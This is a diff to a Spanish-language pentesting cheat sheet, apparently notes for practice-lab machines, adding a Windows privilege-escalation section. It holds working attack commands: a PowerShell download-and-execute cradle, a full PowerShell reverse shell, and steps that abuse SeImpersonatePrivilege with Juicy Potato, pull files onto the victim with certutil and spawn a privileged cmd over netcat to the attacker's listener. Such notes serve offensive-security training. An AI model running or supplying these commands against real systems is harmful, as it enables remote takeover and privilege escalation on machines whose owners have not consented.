@@ -485,8 +485,37 @@ START /B "" powershell -c IEX (New-Object Net.Webclient).downloadstring('http://
 $client = New-Object System.Net.Sockets.TCPClient('10.10.14.2',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
 ## [](#header-2)<a id="Privilege_escalation">Privilege escalation</a>
+Manualmente, tenemos el comando whoami, pero en esta ocacion con los privilegios posibles:
+```s
+whoami /priv
+```
+En este ejemplo 1 tenemos como respuesta el privilegio de SeImpersonatePrivilege, el cual se explota de la forma:
+
+```s
+#Descargamos Juicy Potato de github, esta herramienta nos va a permitir inyectar comandos privilegiados
+git clone https://github.com/ohpe/juicy-potato.git
+#Descargamos el netcan de x64 o x86 
+#Abrimos un servidor de python para traernos los archivos
+python3 -m http.server 8080
+
+#Nos descargamos los archivos en la victima con
+certutil.exe -f -urlcache -split http://10.10.14.29:8080/[Archivos]
+
+#Usamos JuicyPotato con -l {Puerto que sea}, y en este caso abriremos un cmd privilegiado, -a pasandole los argumentos de 
+.\JP.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c C:\Windows\Temp\Privesc\nc.exe -e cmd 10.10.14.29 4646"
+
+#Nos ponemos en escucha desde la maquina atacante
+nc -nlvp 4646
+```
+
 Podemos usar una tool que nos sugiere como explotar un cve para la escalada d elos privilegios
 https://github.com/AonCyberLabs/Windows-Exploit-Suggester
+
+#Primero instalamos las dependencias
+python -m pip install xlrd
+#Actualizamos la base de datos con 
+windows-exploit-suggester.py --update
+
 
 ## [](#header-2)<a id="Post_priv_escalation">Post priv escalation</a>
 
